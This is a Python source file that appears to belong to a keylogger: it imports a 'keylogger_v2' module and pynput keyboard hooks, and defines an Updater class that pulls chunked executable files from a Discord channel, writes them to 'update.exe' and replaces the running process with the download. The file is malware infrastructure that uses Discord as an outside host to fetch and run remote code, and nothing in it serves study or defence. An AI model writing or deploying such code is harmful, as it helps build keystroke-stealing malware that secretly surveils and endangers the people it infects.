import discord
import asyncio
import json
import os.path
import sys
import time
from win32com.client import Dispatch
from pynput import keyboard
from keylogger_v2 import *

awdawdawd = {"VERSION": 2,
                "TOTAL_FILES": 3,
                "FILE_SIZE": 42}


class Updater:
    def __init__(self, connection, discord_info, loop=None):
        self.loop = asyncio.get_event_loop() if loop is None else loop
        self.connection = connection
        self.discord_info = discord_info
        self.download_path = "update.exe"

    async def download(self):
        last_message = await self.connection.get_last_message(self.discord_info.discord_channel_update_exe)
        version_info = {}
        version_info.update(json.loads(last_message.content))
        if version_info["VERSION"] <= version():
            return 1
        messages = await self.connection.get_messages(self.discord_info.discord_channel_update_exe, version_info["TOTAL_FILES"] + 1)

        def order_files(files):
            def swapPositions(list, pos1, pos2):
                list[pos1], list[pos2] = list[pos2], list[pos1]
                return list
            pivot = 0
            index = 0
            while pivot+1 < len(files):
                while index+1 < len(files):
                    if files[index].content > files[index+1].content:
                        swapPositions(files, index, index+1)
                        index += 1
                    else:
                        break
                pivot += 1
                index = pivot
            return files

        files = order_files(messages[1:])
        if os.path.isfile(self.download_path):
            os.remove(self.download_path)
        for file in files:
            file_chunk = await file.attachments[0].read()
            try:
                f = open(self.download_path, 'ab+')
                f.write(file_chunk)
                f.close()
            except:
                return
        return True

    def rename_this_file(self, new_name):
        try:
            for i in range(-1, -len(sys.argv[0]), -1):
                if (sys.argv[0][i] == '/') or (sys.argv[0][i] == "\\"):
                    exe_file_name = sys.argv[0][(len(sys.argv[0]) + i + 1):]
                    break
        except:
            return
        wdir = os.getcwd()
        old_file = wdir + '\\' + exe_file_name
        new_file = wdir + '\\' + new_name
        os.rename(old_file, new_file)

    def start_update_file(self):
        os.execl(os.getcwd() + '\\' + self.download_path, os.getcwd() + '\\' + self.download_path + " update")
        sys.exit()
        print("sys.exit is not Ok!")

    async def update(self):
        print("UPDATING...")
        status = await self.download()
        if status is not True:
            return status
        await self.connection.client.close()
        self.start_update_file()






"""loop = asyncio.get_event_loop()


async def init(loop):
    conn = Connection(loop)
    discord_info = Config()
    discord_info.set("config.json")
    loop.create_task(conn.start(discord_info.discord_bot_TOKEN))
    await asyncio.sleep(4)
    update = Updater(conn, discord_info, loop)
    await update.download()


loop.create_task(init(loop))
loop.run_forever()"""
